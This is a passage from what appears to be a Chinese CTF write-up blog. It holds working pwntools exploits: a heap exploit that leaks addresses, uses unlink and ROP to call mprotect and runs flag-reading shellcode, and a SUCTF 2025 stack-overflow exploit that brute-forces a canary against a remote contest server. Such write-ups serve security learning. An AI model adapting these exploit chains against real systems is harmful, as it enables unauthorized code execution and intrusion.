class="number">1</span>)</span><br><span class="line">	result = <span class="built_in">bytearray</span>()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">8</span>):</span><br><span class="line">		result.extend(<span class="string">b&#x27;\x10\x14&#x27;</span>)</span><br><span class="line">		result.extend(p32(i))</span><br><span class="line">		result.extend(content[i : i+<span class="number">8</span>])</span><br><span class="line">	payload += result</span><br><span class="line">	payload += p8(<span class="number">0</span>)  </span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x418</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>)</span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x207B28</span>)</span><br><span class="line">libc.address = u64(r(<span class="number">8</span>)) - <span class="number">0x203B20</span></span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x1a38</span>)</span><br><span class="line">stack = u64(r(<span class="number">8</span>))</span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x2515C0</span>)</span><br><span class="line">code = u64(r(<span class="number">8</span>)) - <span class="number">0x11a0</span></span><br><span class="line">show(<span class="number">0</span>, <span class="number">0x16f8</span>)</span><br><span class="line">heap = u64(r(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;code&#x27;</span>, code)</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>, heap)</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) +p64(<span class="number">0x471</span>)</span><br><span class="line"></span><br><span class="line">build_unlink(<span class="number">1</span>)</span><br><span class="line">build_unlink2()</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">build_rop1()</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x10f75b</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x110a4d</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x162e3a</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">payload = p64(pop_rdi_ret) + p64(stack&amp;<span class="number">0xfffffffffffff000</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x2000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>) + p64(mprotect) + p64(stack-<span class="number">0x18</span>)</span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>, heap, <span class="number">0x60</span>) + shellcraft.write(<span class="number">1</span>, heap, <span class="number">0x60</span>))</span><br><span class="line">dbg(bp(<span class="number">0x1f55</span>))</span><br><span class="line">build_rop2(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<p>太久没打都忘了,mprotect的第一个参数需要页对齐</p>
<h1 id="2025SUCTF-BABY"><a href="#2025SUCTF-BABY" class="headerlink" title="2025SUCTF-BABY"></a>2025SUCTF-BABY</h1><p>栈溢出+shellcode,有一个256的canary爆破</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii, struct</span><br><span class="line"><span class="keyword">import</span> glverm</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&#x27;./ASU1&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf = ELF(elf_path, checksec = <span class="literal">False</span>)</span><br><span class="line">context.binary = elf_path</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>            :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> flag, drop=<span class="literal">False</span>    :p.recvuntil(flag, drop)</span><br><span class="line">rl  = <span class="keyword">lambda</span>                     :p.recvline()</span><br><span class="line">ra  = <span class="keyword">lambda</span> time=<span class="number">0.5</span>            :p.recvall(timeout = time)</span><br><span class="line">u7f = <span class="keyword">lambda</span>                     :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> flag, content       :p.sendlineafter(flag, content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> flag, content       :p.sendafter(flag, content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content             :p.sendline(content)</span><br><span class="line">s   = <span class="keyword">lambda</span> content             :p.send(content)</span><br><span class="line">irt = <span class="keyword">lambda</span>                     :p.interactive()</span><br><span class="line">tbs = <span class="keyword">lambda</span> content             :<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak= <span class="keyword">lambda</span> name, addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">fmt = <span class="keyword">lambda</span> string              :<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">cw  = <span class="keyword">lambda</span> cmd                 :<span class="string">f&quot;cwatch execute &#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;\n&quot;</span></span><br><span class="line">bp  = <span class="keyword">lambda</span> dst                 : (</span><br><span class="line">    <span class="string">f&quot;b <span class="subst">&#123;dst&#125;</span>\n&quot;</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(dst, <span class="built_in">str</span>) <span class="keyword">else</span></span><br><span class="line">    <span class="string">f&quot;b *$rebase(<span class="subst">&#123;dst&#125;</span>)\n&quot;</span> <span class="keyword">if</span> dst &lt; <span class="number">0x3fe000</span> <span class="keyword">else</span> <span class="string">f&quot;b *<span class="subst">&#123;dst&#125;</span>\n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">load_sym = <span class="string">f&quot;loadsym <span class="subst">&#123;glverm.get_glibc(load_sym, <span class="string">&#x27;debug&#x27;</span>)&#125;</span>\n&quot;</span> <span class="keyword">if</span> (load_sym := <span class="string">&quot;&quot;</span>) <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment"># load_sym := glibc version</span></span><br><span class="line">GDB_SC = load_sym</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">sc = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    LOCAL <span class="keyword">and</span> (gdb.attach(p, GDB_SC + sc <span class="keyword">if</span> sc <span class="keyword">else</span> GDB_SC), pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">return</span> process(elf_path) <span class="keyword">if</span> LOCAL <span class="keyword">else</span> remote(<span class="string">&#x27;1.95.76.73&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time = <span class="number">1</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	p = run()</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;ID:&#x27;</span>, <span class="string">b&#x27;77&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;名称:&#x27;</span>, <span class="string">b&#x27;77&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;特征码值: &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">42</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;文件数据:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;征码值查询&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">b&#x27;6&#x27;</span>*<span class="number">42</span>)</span><br><span class="line">	stack = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">	leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">	shellcode1 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)) + <span class="string">b&quot;\xEB\x55&quot;</span></span><br><span class="line">	shellcode2 = asm(shellcraft.read(<span class="number">3</span>, stack, <span class="number">0x60</span>))+ <span class="string">b&quot;\xeb\x42&quot;</span></span><br><span class="line">	shellcode3 = asm(shellcraft.write(<span class="number">1</span>, stack, <span class="number">0x60</span>))</span><br><span class="line">	<span class="comment">#dbg(bp(0x401711))</span></span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;ID:&#x27;</span>, <span class="string">b&#x27;78&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;名称:&#x27;</span>, <span class="string">b&#x27;78&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;特征码值: &#x27;</span>, shellcode1)</span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;ID:&#x27;</span>, <span class="string">b&#x27;79&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;名称:&#x27;</span>, <span class="string">b&#x27;79&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;特征码值: &#x27;</span>, shellcode2)</span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;ID:&#x27;</span>, <span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;名称:&#x27;</span>, <span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;特征码值: &#x27;</span>, shellcode3)</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;请选择操作:&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;文件数据:&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">1</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">	<span class="comment">#dbg(bp(0x4026F3))</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;请输入文件名称&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">	es = stack - <span class="number">0xAE52</span></span><br><span class="line">	sa(<span class="string">&#x27;请输入文件内容&#x27;</span>, p64(<span class="number">0x400F56</span>))</span><br><span class="line">	res = r()</span><br><span class="line">	<span class="built_in">print</span>(time)</span><br><span class="line">	time += <span class="number">1</span></span><br><span class="line">	<span class="built_in">print</span>(res)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> r():</span><br><span class="line">		s(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#		dbg(bp(0x4026F3))</span></span><br><span class="line">		sa(<span class="string">b&#x27;What do you want to do?&#x27;</span>, p64(es))</span><br><span class="line">		irt()</span><br><span class="line">		</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023seccon-rop-2-35"><span class="toc-number">1.</span> <span class="toc-text">2023seccon-rop-2.35</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E9%A2%98%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">其它题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASIS2023-hipwn"><span class="toc-number">2.</span> <span class="toc-text">ASIS2023-hipwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E7%9A%84%E5%9D%91"><span class="toc-number">2.1.</span> <span class="toc-text">踩的坑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-silent"><span class="toc-number">3.</span> <span class="toc-text">2023鹏城杯-silent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A31"><span class="toc-number">3.0.1.</span> <span class="toc-text">解1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A32"><span class="toc-number">3.0.2.</span> <span class="toc-text">解2:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-noob-heap"><span class="toc-number">4.</span> <span class="toc-text">2023第六届强网拟态- noob_heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Etcache%E5%92%8Cfast%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84heap-leak"><span class="toc-number">4.1.</span> <span class="toc-text">关于tcache和fast加密后的heap leak</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023hitctf-scanf"><span class="toc-number">5.</span> <span class="toc-text">2023hitctf-scanf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tpctf-safehttpd"><span class="toc-number">6.</span> <span class="toc-text">2023tpctf-safehttpd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-25139"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2023-25139</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rand"><span class="toc-number">6.2.</span> <span class="toc-text">rand</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tctf-c00ledit"><span class="toc-number">7.</span> <span class="toc-text">2023tctf-c00ledit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tctf-%E6%97%A0%E4%B8%AD%E7%94%9F%E6%9C%89"><span class="toc-number">8.</span> <span class="toc-text">2023tctf-无中生有</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A31-1"><span class="toc-number">8.1.</span> <span class="toc-text">解1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A32-1"><span class="toc-number">8.2.</span> <span class="toc-text">解2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp-tools%E6%A3%80%E6%B5%8B%E5%B8%A6%E5%8F%82%E6%95%B0elf"><span class="toc-number">8.3.</span> <span class="toc-text">seccomp-tools检测带参数elf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%BC%BA%E7%BD%91%E6%9D%AF-ez-fmt"><span class="toc-number">9.</span> <span class="toc-text">2023强网杯-ez_fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%BC%BA%E7%BD%91%E6%9D%AF-warmup23"><span class="toc-number">10.</span> <span class="toc-text">2023强网杯-warmup23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flat%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">10.1.</span> <span class="toc-text">flat的使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%AE%89%E6%B4%B5%E6%9D%AF-side-channel"><span class="toc-number">11.</span> <span class="toc-text">2023安洵杯-side-channel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%AE%89%E6%B4%B5%E6%9D%AF-seccomp"><span class="toc-number">12.</span> <span class="toc-text">2023安洵杯-seccomp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024MAPNA-buggy-paint"><span class="toc-number">13.</span> <span class="toc-text">2024MAPNA-buggy_paint</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E9%95%BF%E5%9F%8E%E6%9D%AF-shutup"><span class="toc-number">14.</span> <span class="toc-text">2024长城杯-shutup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E9%95%BF%E5%9F%8E%E6%9D%AF-sometime"><span class="toc-number">15.</span> <span class="toc-text">2024长城杯-sometime</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024d3ctf-write-where-flag"><span class="toc-number">16.</span> <span class="toc-text">2024d3ctf-write_where_flag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#solution1"><span class="toc-number">16.1.</span> <span class="toc-text">solution1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solution2"><span class="toc-number">16.2.</span> <span class="toc-text">solution2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solution3"><span class="toc-number">16.3.</span> <span class="toc-text">solution3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024d3ctf-d3note"><span class="toc-number">17.</span> <span class="toc-text">2024d3ctf-d3note</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-gostack"><span class="toc-number">18.</span> <span class="toc-text">2024ciscn-gostack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-orange-cat-diary"><span class="toc-number">19.</span> <span class="toc-text">2024ciscn-orange_cat_diary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-ezheap"><span class="toc-number">20.</span> <span class="toc-text">2024ciscn-ezheap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2025SUCTF-Text"><span class="toc-number">21.</span> <span class="toc-text">2025SUCTF-Text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2025SUCTF-BABY"><span class="toc-number">22.</span> <span class="toc-text">2025SUCTF-BABY</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/26406/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/26406/&text=赛题录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/26406/&is_video=false&description=赛题录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=赛题录&body=Check out this article: https://ixout.github.io/posts/26406/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/26406/&name=赛题录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/26406/&t=赛题录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>
        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
